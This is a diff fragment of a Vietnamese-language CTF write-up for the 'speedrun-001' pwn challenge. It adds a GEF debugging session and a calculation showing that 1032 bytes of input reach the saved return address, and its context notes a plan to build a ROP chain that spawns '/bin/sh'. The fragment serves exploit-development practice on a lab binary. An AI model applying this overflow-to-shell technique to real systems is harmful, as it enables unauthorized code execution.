@@ -72,6 +72,75 @@ syscall
 ```
 
 Theo linux syscall reference, rax bằng 0 tương đương lệnh read, đây là cách chương trình nhận input  
+Tính số ký tự cần nhập trước lệnh ret:
+
+```
+gef➤  r
+Starting program: /home/kali/Documents/ctf_prac/pwn/speedrun-001 
+Hello brave new challenger
+Any last words?
+abc
+
+Breakpoint 1, 0x0000000000400b90 in ?? ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x4               
+$rbx   : 0x0000000000400400  →   sub rsp, 0x8
+$rcx   : 0x00000000004498ae  →  0x5a77fffff0003d48 ("H="?)
+$rdx   : 0x7d0             
+$rsp   : 0x00007fffffffd910  →  0x000000000a636261 ("abc\n"?)
+$rbp   : 0x00007fffffffdd10  →  0x00007fffffffdd30  →  0x0000000000401900  →   push r15
+$rsi   : 0x00007fffffffd910  →  0x000000000a636261 ("abc\n"?)
+$rdi   : 0x0               
+$rip   : 0x0000000000400b90  →   lea rax, [rbp-0x400]
+$r8    : 0xf               
+$r9    : 0x00000000006bd880  →  0x00000000006bd880  →  [loop detected]
+$r10   : 0x1               
+$r11   : 0x246             
+$r12   : 0x00000000004019a0  →   push rbp
+$r13   : 0x0               
+$r14   : 0x00000000006b9018  →  0x0000000000440ea0  →   mov rcx, rsi
+$r15   : 0x0               
+$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffd910│+0x0000: 0x000000000a636261 ("abc\n"?)        ← $rsp, $rsi
+0x00007fffffffd918│+0x0008: 0x0000000000000000
+0x00007fffffffd920│+0x0010: 0x0000000000000000
+0x00007fffffffd928│+0x0018: 0x0000000000000000
+0x00007fffffffd930│+0x0020: 0x0000000000000000
+0x00007fffffffd938│+0x0028: 0x0000000000000000
+0x00007fffffffd940│+0x0030: 0x0000000000000000
+0x00007fffffffd948│+0x0038: 0x0000000000000000
+───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400b83                  mov    rsi, rax
+     0x400b86                  mov    edi, 0x0
+     0x400b8b                  call   0x4498a0
+●→   0x400b90                  lea    rax, [rbp-0x400]
+     0x400b97                  mov    rsi, rax
+     0x400b9a                  lea    rdi, [rip+0x919b7]        # 0x492558
+     0x400ba1                  mov    eax, 0x0
+     0x400ba6                  call   0x40f710
+     0x400bab                  nop    
+────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "speedrun-001", stopped 0x400b90 in ?? (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400b90 → lea rax, [rbp-0x400]
+[#1] 0x400c1d → mov eax, 0x0
+[#2] 0x4011a9 → mov edi, eax
+[#3] 0x400a5a → hlt 
+───────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  info frame
+Stack level 0, frame at 0x7fffffffdd20:
+ rip = 0x400b90; saved rip = 0x400c1d
+ called by frame at 0x7fffffffdd40
+ Arglist at 0x7fffffffd908, args: 
+ Locals at 0x7fffffffd908, Previous frame's sp is 0x7fffffffdd20
+ Saved registers:
+  rbp at 0x7fffffffdd10, rip at 0x7fffffffdd18
+```
+
+Số ký tự cần nhập trước ret = 0x7fffffffdd18 - 0x00007fffffffd910 = 0x408 = 1032  
 Ý tưởng khai thác: sử dụng kỹ thuật ROPchain lấy shell  
 Tìm 1 chỗ lưu chuỗi "/bin/sh/0":
 
